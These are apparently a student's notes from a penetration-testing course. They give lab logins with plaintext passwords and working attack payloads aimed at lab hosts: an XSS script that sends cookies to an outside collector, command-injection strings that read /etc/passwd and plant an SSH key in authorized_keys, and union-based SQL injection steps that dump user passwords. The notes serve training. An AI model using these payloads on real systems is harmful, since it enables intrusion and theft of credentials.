### LOGIN INFO ###
Please log into Lins-ops
find IPs on vta.cybbh.space

control shift V to preview

class info: 10.50.46.45/classinfo.html
Keep this output in your notes, password for pivot/-jump box and CTFd, 10.50 is your Jump box for challenges

OLD CTFd: 10.50.20.250:8000

New CTFd: 10.50.20.30:8000


ssh into my workstation -> ssh -X student@10.50.39.223
password: password 

JUMP_BOX!!!
username: MAKI-502-B
password: d07PevVUniUxBNR

Record deleted successfully
Stack Number  |	Username	| Password	        |    lin.internet
-------------------------------------------------------------------
16	          |  MAKI-502-B	|  d07PevVUniUxBNR  |	    10.50.23.132

to ssh into the jumpbox -> ssh student@10.50.23.132 with the password as d07PevVUniUxBNR

linux-ops ip address: 10.50.24.96
    username: student
    password: password
jump-box: 10.50.23.132
    username: student
    password: d07PevVUniUxBNR

winops: 10.50.27.161


VTA_creds: https://vta.cybbh.space/horizon/project/
Username: mahlon.k.kirwa80
password: regular linux password
Domain: ipa

Jump box:
cctc.cybb

Link slides and what not - https://sec.cybbh.io/public/security/latest/index.html

Instances - https://vta.cybbh.space/horizon/project/instances/

## SECURITY MODULES ##


LESSONS:
1. Penetration testing
2. Reconnaissance
3. Exploit Research
4. Web Exploitation - Day 1
5. Web Exploitation - Day 2
6. Reverse Engineering
7. Exploit Development Testing
8. Post Exploitation
9. Windows Exploitation
10. Linux Exploitation

### PENETRATION TESTING ###

Phases:
1. Phase 1 - Mission definition
2. Phase 2 - Recon
3. Phase 3 - Footprinting
4. Phase 4 - Exploitation and Initial Access
5. Phase 5 - Post Exploitation
6. Phase 6 - Document Mission

for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done # Does the first 1000 scans. For the ping sweep... 

Always run the regular scans like above before you try banner grabbing (a technique used to gain information about a computer on a network and the services running on its open ports.)

storage nmap scripts -> ls /usr/share/nmap/scripts/
Popular scripts: ftp-anon.nse, http-enum.nse, smb-os-discovery.nse

How to get information about a certain script -> proxychains nmap [target_ip_address]-Pn -p [target_port] --script-help [target_script]
                                                             nmap ip 192.168.28.97-100, 100,105,111,120 -pm


## Web Exploits CSS ##

proxychains nmap 10.50.45.162 -Pn --script http-enum -p 80

nc -kvnl 8000

n- translates dns

 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
http://10.50.20 ------ needs to be your ip address...


ping 8.8.8.8 ;cat /etc/passwd -> Lets you run and see if 

;cat ~/.ssh/id_rsa.pub

;mkdir /var/www/.ssh

;whoami

;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR" >> /var/www/.ssh/authorized_keys

ssh www-data@10.50.45.162

malicious file upload.... 


10.50.45.62




http://10.100.28.40/Contract_bids.html
http://10.100.28.40/net_test/industry_check.php
http://10.100.28.40/


 <script>document.location="http://10.50.49.22:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
http://10.50.20 ------ needs to be your ip address...


<script>document.location="http://10.50.39.223:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
192.168.65.20

## SQL ##

MariaDB > select carid, name, cost from car;
MariaDB > select carid, name, cost from session.car where carid=4; 
MariaDB > select database(); # shows you where you are with your current database. 
MariaDB > select table_schema, table_name, column_name from information_schema.columns;

table_schema: Refers to the name of the schema (often used interchangeably with "database" in some DBMS) to which the table belongs.
The information_schema.columns table is a meta-table that contains information about all columns in all tables in the database system.

MariaDB > select table_name from information_schema.columns where table_schema=session;
MariaDB > select @@version;
MariaDB > select load_file("/etc/passwd);
MariaDB > select carid, name, cost from session.car union select name, pass, id from session.user;

SELECT * FROM movies;

SELECT * FROM movies where year<2000 or year>2010; # Finding movies not released in the years between 2000 and 2010.
SELECT * FROM movies where id>=1 and id<=5; # Finding the first 5 pixar movies. 
SELECT * FROM movies WHERE Title LIKE '%toy story%'; # Find all the Toy Story movies
SELECT * FROM movies WHERE Director='John Lasseter'; # Find all movies directed by John Lasseter
SELECT * FROM movies WHERE Title like 'WALL-%'; # Find all the WALL-* movies
SELECT DISTINCT Director FROM movies ORDER BY Director ASC; # List all directors of Pixar movies (alphabetically), without duplicates 
SELECT * FROM movies ORDER BY year DESC limit 4; # List the last four Pixar movies released (ordered from most recent to least) 
SELECT * FROM movies ORDER BY title ASC limit 5; # List the first five Pixar movies sorted alphabetically


WHERE Price BETWEEN 10 AND 20;

USE session;
SELECT id FROM user WHERE name='tom' OR 1=1;

steps sql injection
1. in both the password and username field, enter: tom' or 1='1
2. Inspect html and change form from post to get 
3. login and see the information

You will get all selects except for one challenge. 

step 1 -> http://10.50.46.45/uniondemo.php?Selection=2 or% 1=1 -> Keep increasing the value on the selection until an output is derived
step 2 -> http://10.50.46.45/uniondemo.php?Selection=2 union select 1,2,3 union select, find out if there values are ordered

We now know they're not inorder and that 2 is vulnerable let's look at the table schema 
step 3 -> http://10.50.46.45/uniondemo.php?Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

union demo - http://10.50.46.45/Union.html

ford' or 1=1; #   ---> Try this gives this select name, type, cost, color, year from car where name='ford\' or 1=1; #' 
select name, type, cost, color, year from car where name='audi\' or 1=\'1'

0. ford' or 1='1; this didn't work why???
1. ford' or 1=1; # after this we try audi next
2. Audi' or 1=1; #' ----> gives this select name, type, cost, color, year from car where name='Audi' or 1=1; # ' -----> SUCCESS!!!
3. Now we need union select 
4. Audi' union select 1,2,3,4; # -----> doesn't work.. 
5. Audi' union select 1,2,3,4,5; # ----> works.. looks like I added 
6. Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #      ----> GOLDEN STATEMENT ALLOWS US TO KNOW WHAT TO WRITE FOR THAT SITUATION. Helps us to write a valid query for content
7. Audi' Union select id,null,name,pass,null from session.user; #
query -----> select name, type, cost, color, year from car where name='Audi' Union select id,2,name,pass,null from session.user; #'


## REVERSE ENGINEERING ##
